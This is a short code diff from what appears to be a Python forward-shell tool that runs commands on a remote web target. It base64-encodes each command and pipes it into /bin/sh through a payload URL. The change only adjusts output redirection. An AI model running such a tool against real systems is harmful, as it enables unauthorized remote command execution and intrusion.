@@ -155,7 +155,7 @@ class ForwardShell:
 		else:
 			cmd = f'{cmd}\n'
 			b64Cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
-			unwrapAndExec = f'echo {b64Cmd} | base64 -d | /bin/sh &> /dev/null'
+			unwrapAndExec = f'echo {b64Cmd} | base64 -d | /bin/sh >& /dev/null'
 
 		ForwardShell.runRawCmd(unwrapAndExec, self._url, self._proxy, self._payloadName, self._genPayload)
 		sleep(self._interval * 1.2)
@@ -241,7 +241,7 @@ def main():
 				del sh
 				cmd = f'rm -f {args.pipes_path}/{INPUT}.* {args.pipes_path}/{OUTPUT}.*\n'
 				b64Cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
-				unwrapAndExec = f'echo {b64Cmd} | base64 -d | /bin/sh &> /dev/null'
+				unwrapAndExec = f'echo {b64Cmd} | base64 -d | /bin/sh >& /dev/null'
 				ForwardShell.runRawCmd(unwrapAndExec, url, proxy, payloadName, payloadModule.genPayload)
 				break
 
